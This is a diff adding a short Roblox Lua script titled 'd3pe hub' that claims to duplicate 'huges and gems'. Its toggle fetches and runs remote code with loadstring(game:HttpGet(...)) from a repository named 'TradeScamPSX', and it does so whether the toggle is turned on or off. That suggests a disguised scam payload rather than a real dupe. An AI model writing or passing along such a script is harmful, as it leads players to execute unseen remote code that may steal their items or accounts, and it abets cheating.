@@ -1,0 +1,16 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("d3pe hub", "Ocean")
+    -- MAIN
+    local Main = Window:NewTab("Main")
+    local MainSection = Main:NewSection("Main")
+
+
+    MainSection:NewToggle("duping", "dupes all huges and gems", function(state)
+        if state then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/leotovalid/TradeScamPSX/main/dupegodss"))()
+
+        else
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/leotovalid/TradeScamPSX/main/dupegodss"))()
+
+        end
+    end)
